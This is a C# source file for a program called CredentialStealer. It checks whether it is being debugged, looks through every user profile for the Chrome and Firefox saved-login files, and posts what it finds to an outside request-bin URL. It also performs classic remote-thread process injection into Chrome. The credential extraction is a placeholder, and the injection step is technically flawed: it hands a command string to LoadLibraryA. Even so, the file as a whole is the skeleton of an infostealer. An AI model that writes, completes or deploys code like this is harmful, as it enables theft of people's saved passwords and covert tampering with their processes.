using System;
using System.IO;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Diagnostics;

class CredentialStealer
{
    // Anti-Debugging: Check if the process is being debugged
    [DllImport("kernel32.dll")]
    static extern bool IsDebuggerPresent();

    // Process Injection: OpenProcess, VirtualAllocEx, WriteProcessMemory, CreateRemoteThread
    [DllImport("kernel32.dll")]
    static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint dwSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    // GetModuleHandle and GetProcAddress for process injection
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    // Main method
    static async Task Main(string[] args)
    {
        if (IsDebuggerPresent())
        {
            Console.WriteLine("Debugging detected. Exiting...");
            return;
        }

        // Inject process into the target process
        InjectProcess("chrome");

        // Retrieve and send credentials
        string[] userProfiles = GetLocalUserProfiles();
        foreach (string userProfile in userProfiles)
        {
            string chromePath = Path.Combine(userProfile, @"AppData\Local\Google\Chrome\User Data\Default\Login Data");
            string firefoxPath = Path.Combine(userProfile, @"AppData\Roaming\Mozilla\Firefox\Profiles\*.default\signons.sqlite");

            string credentials = ExtractCredentials(chromePath, firefoxPath);

            if (!string.IsNullOrEmpty(credentials))
            {
                await SendCredentials(credentials);
            }
        }
    }

    static string[] GetLocalUserProfiles()
    {
        string userProfilesDir = @"C:\Users";
        string[] userProfiles = Directory.GetDirectories(userProfilesDir);
        return userProfiles;
    }

    static string ExtractCredentials(string chromePath, string firefoxPath)
    {
        // Placeholder for credentials extraction logic
        string credentials = "";

        if (File.Exists(chromePath))
        {
            credentials += $"Chrome: {chromePath}\n";
        }

        if (File.Exists(firefoxPath.Replace("*", "")))
        {
            credentials += $"Firefox: {firefoxPath.Replace("*", "")}\n";
        }

        return credentials;
    }

    static async Task SendCredentials(string credentials)
    {
        string serverUrl = "https://eocpe8aqj4djil7.m.pipedream.net"; // Replace with your actual RequestBin URL
        using (HttpClient client = new HttpClient())
        {
            var content = new StringContent($"credentials={Uri.EscapeDataString(credentials)}", Encoding.UTF8, "application/x-www-form-urlencoded");
            HttpResponseMessage response = await client.PostAsync(serverUrl, content);
            string responseBody = await response.Content.ReadAsStringAsync();
            Console.WriteLine("Credentials sent: " + responseBody);
        }
    }

    static void InjectProcess(string processName)
    {
        Process[] processes = Process.GetProcessesByName(processName);
        if (processes.Length > 0)
        {
            Process targetProcess = processes[0];

            IntPtr processHandle = OpenProcess(0x001F0FFF, false, targetProcess.Id);
            IntPtr kernel32Base = GetModuleHandle("kernel32.dll");
            IntPtr loadLibraryAddress = GetProcAddress(kernel32Base, "LoadLibraryA");

            // Example command line to execute; this should be your injected code
            string commandLine = "cmd.exe /c start notepad.exe";
            IntPtr commandLineAddress = VirtualAllocEx(processHandle, IntPtr.Zero, (uint)(commandLine.Length + 1), 0x1000, 0x40);
            WriteProcessMemory(processHandle, commandLineAddress, Encoding.UTF8.GetBytes(commandLine + "\0"), (uint)(commandLine.Length + 1), out IntPtr bytesWritten);
            CreateRemoteThread(processHandle, IntPtr.Zero, 0, loadLibraryAddress, commandLineAddress, 0, IntPtr.Zero);
        }
    }
}